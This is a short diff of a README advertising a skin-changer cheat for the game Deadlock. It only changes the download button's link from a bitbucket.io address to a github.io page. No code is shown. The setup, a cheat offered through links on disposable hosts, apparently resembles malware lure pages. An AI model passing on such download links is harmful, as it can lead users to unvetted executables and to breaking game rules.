@@ -4,7 +4,7 @@ Deadlock’s visual style is clean, colorful, and stacked with cosmetics — but
 
 Whether you want to look like a day-one OG or rock unreleased skins just for the flex, this cheat makes sure you’re **the flashiest player in every lobby**.
 
-[![Download SkinChanger](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://fileoffload15.bitbucket.io)
+[![Download SkinChanger](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://Deadlock-SkinChanger-ryteg.github.io/.github)
 ---
 
 ## 🎨 What Is the Deadlock SkinChanger?
